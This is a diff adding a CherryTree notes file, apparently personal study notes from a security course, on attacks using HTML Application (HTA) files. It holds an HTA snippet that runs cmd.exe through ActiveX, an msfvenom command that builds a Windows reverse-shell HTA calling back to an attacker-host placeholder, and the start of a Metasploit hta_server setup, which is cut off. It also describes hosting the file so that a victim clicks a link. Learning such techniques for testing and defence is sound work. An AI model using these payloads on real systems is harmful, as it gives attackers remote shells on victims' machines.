@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="An HTML Application - HTA" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1707379080" ts_lastsave="1707380324">
+    <rich_text scale="h2" weight="heavy">HTA = HTML Application</rich_text>
+    <rich_text>
+
+The tool “mshta” is used for the execution of an HTA file. It can be executed by itself or automatically from the Internet Explorer.
+
+
+Using python, this html file can be hosted on the attacker machine, while on the victim machine the hosted page can be invoked, clicking on the web-link.
+
+</rich_text>
+    <rich_text scale="h2" weight="heavy">HTA Reverse Connection</rich_text>
+    <rich_text>
+
+Creating a reverse shell payload using msfvenom:
+
+
+</rich_text>
+    <rich_text scale="h2" weight="heavy">Malicious HTA via Metasploit</rich_text>
+    <rich_text>
+
+You can also create a payload and start a server and listener using Metasploit:
+
+
+</rich_text>
+    <codebox char_offset="158" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="html" highlight_brackets="0" show_line_numbers="0">&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+	var c= 'cmd.exe'
+	new ActiveXObject('WScript.Shell').Run(c);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html
+</codebox>
+    <codebox char_offset="389" justification="left" frame_width="826" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="0" show_line_numbers="0">$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;attacking-host-ip&gt; LPORT=443 -f hta-psh -o thm.hta</codebox>
+    <codebox char_offset="502" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="0" show_line_numbers="0">$ msfconsole
+msf6 &gt; use exploit/windows/misc/hta_server
+msf6 &gt; set LHOST &lt;attacker</codebox>
+  </node>
+</cherrytree>
